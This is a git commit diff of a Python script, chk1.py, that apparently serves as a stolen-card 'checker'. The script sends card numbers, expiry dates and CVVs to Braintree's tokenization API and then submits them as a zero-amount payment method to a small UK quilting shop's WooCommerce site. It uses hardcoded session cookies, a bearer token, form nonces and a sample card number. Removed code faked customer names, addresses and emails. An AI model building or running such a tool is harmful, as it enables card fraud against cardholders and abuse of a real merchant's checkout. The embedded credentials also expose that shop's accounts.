5b4c1dc086d377d965ae14f63115bdab11eb0f13
yousef12102008 <moh552vbnm@gmail.com>
2024-07-03 20:57:11 +0300

    Update chk1.py

--- chk1.py
+++ chk1.py
@@ -25,73 +25,64 @@ def chk(card):
 	user = user_agent.generate_user_agent()
 	
 	
-	def generate_full_name():
-	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
-	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
-	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
-	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
-	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
-	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
-	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
-	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
-	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
-	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
-	    
-	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
-	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
-	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
-	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
-	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
-	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
-	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
-	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
-	                   
-	    full_name = random.choice(first_names) + " " + random.choice(last_names)
-	    first_name, last_name = full_name.split()
-	    
-	    return first_name, last_name
-	
-	def generate_address():
-	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
-	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
-	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
-	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
-	
-	    city = random.choice(cities)
-	    state = states[cities.index(city)]
-	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
-	    zip_code = zip_codes[states.index(state)]
-	
-	    return city, state, street_address, zip_code
-	
-	
-	first_name, last_name = generate_full_name()
-	city, state, street_address, zip_code = generate_address()
-	
-	def generate_random_account():
-		name = ''.join(random.choices(string.ascii_lowercase, k=20))
-		number = ''.join(random.choices(string.digits, k=4))
-		
-		return f"{name}{number}@gmail.com"
-	acc = (generate_random_account())
-	
-	
-	def num():
-		number = ''.join(random.choices(string.digits, k=7))
-		return f"303{number}"
-	num = (num())
-	
-	
-	def generate_random_code(length=32):
-	    letters_and_digits = string.ascii_letters + string.digits
-	    return ''.join(random.choice(letters_and_digits) for _ in range(length))
-	
-	corr = generate_random_code()
-	
-	sess = generate_random_code()
-	
 
 
+	headers = {
+    'authority': 'payments.braintree-api.com',
+    'accept': '*/*',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAxMTE4MjMsImp0aSI6IjY2MWIxNTdiLWNjZGItNDJkNi1hOTJhLTBmYzU4ZjkyYTdiZSIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.5aBqrpa80w12miEuJ6q6vk7FVDnp7R1KVlj5V4EW7KqXlhA0M_O3LifOZraOHcOvwtmz4FuwBvSUxg0uXlovDA',
+    'braintree-version': '2018-05-10',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'pragma': 'no-cache',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+
+	json_data = {
+    'clientSdkMetadata': {
+        'source': 'client',
+        'integration': 'custom',
+        'sessionId': 'f8da52c9-8f14-44a9-a777-3b9a94920196',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': n,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"f8da52c9-8f14-44a9-a777-3b9a94920196"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+	
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+	
+	
+	
+	
+	
 
 
 	cookies = {
@@ -99,15 +90,15 @@ def chk(card):
     'eucookielaw': '1735134150572',
     'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26',
     '_ga_EX1GV7CW1V': 'GS1.1.1719582147.1.1.1719582533.0.0.0',
-    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '196%7Cother%7Cread%7C6fd4556405e84a784e36d2b686cc82043d623cfb8713d9d52b49f945e873d682',
+    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '196%7Cother%7Cread%7C867653c136a136da0c63887384dd3490914da40d810b0baff069a264b9cbc19a',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-07-02%2013%3A05%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fpayment-methods%2F',
-    'sbjs_first_add': 'fd%3D2024-07-02%2013%3A05%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_current_add': 'fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    '_ga_347410393': 'GS1.1.1719925310.6.1.1719925637.0.0.0',
-    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_347410393': 'GS1.1.1720025273.7.0.1720025279.0.0.0',
+    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
@@ -115,9 +106,11 @@ def chk(card):
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
-    # 'cookie': '_ga=GA1.1.242160314.1719582147; eucookielaw=1735134150572; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26; _ga_EX1GV7CW1V=GS1.1.1719582147.1.1.1719582533.0.0.0; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=196%7Cother%7Cread%7C6fd4556405e84a784e36d2b686cc82043d623cfb8713d9d52b49f945e873d682; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-02%2013%3A05%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-07-02%2013%3A05%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga_347410393=GS1.1.1719925310.6.1.1719925637.0.0.0; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': '_ga=GA1.1.242160314.1719582147; eucookielaw=1735134150572; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26; _ga_EX1GV7CW1V=GS1.1.1719582147.1.1.1719582533.0.0.0; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=196%7Cother%7Cread%7C867653c136a136da0c63887384dd3490914da40d810b0baff069a264b9cbc19a; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga_347410393=GS1.1.1720025273.7.0.1720025279.0.0.0; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'origin': 'https://www.carolyngibbsquilts.co.uk',
     'pragma': 'no-cache',
-    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/payment-methods/',
+    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -129,126 +122,28 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	response = requests.get('https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
-	
-	
-	
-	
-	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
-	
-	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-	
-	
-	
-	headers = {
-    'accept': '*/*',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
-}
-	
-	data = {
-	    'action': 'wc_braintree_credit_card_get_client_token',
-	    'nonce': client_token_nonce,
-	}
-	
-	response = r.post('https://www.carolyngibbsquilts.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data, cookies=cookies)
-	
-	
-	
-	encoded_text = (response.json()['data'])
-	
-	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
-	
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
-	
-	
-	
-	
-	import requests
-	
-	headers = {
-	    'authority': 'payments.braintree-api.com',
-	    'accept': '*/*',
-	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
-	    'authorization': f'Bearer {au}',
-	    'braintree-version': '2018-05-10',
-	    'cache-control': 'no-cache',
-	    'content-type': 'application/json',
-	    'origin': 'https://assets.braintreegateway.com',
-	    'pragma': 'no-cache',
-	    'referer': 'https://assets.braintreegateway.com/',
-	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'cross-site',
-	    'user-agent': user,
-	}
-	
-	json_data = {
-	    'clientSdkMetadata': {
-	        'source': 'client',
-	        'integration': 'custom',
-	        'sessionId': 'd8da16b6-25c1-4f60-a425-6b82ab138809',
-	    },
-	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-	    'variables': {
-	        'input': {
-	            'creditCard': {
-	                'number': n,
-	                'expirationMonth': mm,
-	                'expirationYear': yy,
-	                'cvv': cvc,
-	            },
-	            'options': {
-	                'validate': False,
-	            },
-	        },
-	    },
-	    'operationName': 'TokenizeCreditCard',
-	}
-	
-	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-	
-	tok = response.json()['data']['tokenizeCreditCard']['token']
-	
-	
-	
-	
-	
-	headers = {
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'user-agent': user,
-}
-	
 	data = [
     ('wc_braintree_paypal_payment_nonce', ''),
-    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"a39edd72287e0d7fe6b15f8f891deef2"}'),
     ('wc-braintree-paypal-context', 'shortcode'),
-    ('wc_braintree_paypal_amount', '5.00'),
+    ('wc_braintree_paypal_amount', '0.00'),
     ('wc_braintree_paypal_currency', 'GBP'),
     ('wc_braintree_paypal_locale', 'en_gb'),
     ('wc-braintree-paypal-tokenize-payment-method', 'true'),
     ('payment_method', 'braintree_credit_card'),
-    ('wc-braintree-credit-card-card-type', 'visa'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
     ('wc-braintree-credit-card-3d-secure-enabled', ''),
     ('wc-braintree-credit-card-3d-secure-verified', ''),
-    ('wc-braintree-credit-card-3d-secure-order-total', '5.00'),
-    ('wc_braintree_credit_card_payment_nonce', tok),
-    ('wc_braintree_device_data', '{"correlation_id":"2a69a908c3578910bbb43ae8f1288024"}'),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce', tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"a39edd72287e0d7fe6b15f8f891deef2"}'),
     ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
-    ('woocommerce-add-payment-method-nonce', add_nonce),
+    ('woocommerce-add-payment-method-nonce', '18824bb10b'),
     ('_wp_http_referer', '/my-account/add-payment-method/'),
     ('woocommerce_add_payment_method', '1'),
 ]
-	
-	response = r.post(
+
+	response = requests.post(
     'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
